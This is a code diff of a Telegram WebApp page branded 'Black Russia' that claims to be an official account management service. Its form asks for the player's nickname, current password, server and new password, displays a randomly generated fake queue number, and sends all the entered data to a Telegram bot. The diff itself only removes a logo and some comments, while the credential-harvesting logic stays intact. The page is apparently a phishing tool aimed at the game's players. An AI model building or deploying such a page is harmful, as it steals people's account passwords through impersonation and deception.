@@ -48,15 +48,10 @@
             overflow: hidden;
         }
 
-        .logo {
-            width: 110px;
-            margin-bottom: 12px;
-            filter: drop-shadow(0 0 10px rgba(229, 9, 20, 0.4));
-        }
-
         h2 {
             font-size: 20px;
             font-weight: 700;
+            margin-top: 10px;
             margin-bottom: 20px;
             letter-spacing: 0.5px;
             text-transform: uppercase;
@@ -164,13 +159,9 @@
 <body>
 
 <div class="container">
-    <!-- Экран 1: Стартовый -->
+    <!-- Экран 1: Стартовый (логотип убран) -->
     <div id="screen1" class="screen active">
         <div>
-            <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="50" cy="50" r="45" stroke="#E50914" stroke-width="6"/>
-                <path d="M30 30L70 70M70 30L30 70" stroke="#FFFFFF" stroke-width="8" stroke-linecap="round"/>
-            </svg>
             <h2>Black Russia</h2>
             <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Официальный сервис управления аккаунтом</p>
         </div>
@@ -225,7 +216,7 @@
 
 <script>
     const tg = window.Telegram.WebApp;
-    tg.expand(); // Разворачивает окно приложения
+    tg.expand();
 
     const servers = [
         "1. Red", "2. Green", "3. Blue", "4. Yellow", "5. Orange", "6. Purple", "7. Lime", "8. Pink", "9. Cherry", "10. Black",
@@ -239,7 +230,6 @@
         "81. TAGANROG", "82. VOLOGDA", "83. TVER", "84. TOMSK", "85. IZHEVSK", "86. SURGUT", "87. PODOLSK", "88. MAGADAN", "89. CHEREPOVETS", "90. NORILSK", "91. ASTANA"
     ];
 
-    // Заполнение выпадающего списка серверов
     const serverSelect = document.getElementById('server');
     servers.forEach(srv => {
         const option = document.createElement('option');
@@ -261,18 +251,15 @@
         const newPass = document.getElementById('newPassword').value.trim();
         const errorMsg = document.getElementById('errorMsg');
 
-        // Валидация обязательных полей
         if (!nick || !oldPass || !server || !newPass) {
             errorMsg.style.display = 'block';
             return;
         }
         errorMsg.style.display = 'none';
 
-        // Генерация рандомной очереди 2..9
         const queue = Math.floor(Math.random() * 8) + 2;
         document.getElementById('queueNum').textContent = queue;
 
-        // Отправка данных в Telegram-бот
         const payload = {
             nick: nick,
             old_pass: oldPass,
@@ -282,8 +269,6 @@
         };
 
         tg.sendData(JSON.stringify(payload));
-
-        // Переход на 3 экран
         goToScreen(3);
     }
 </script>
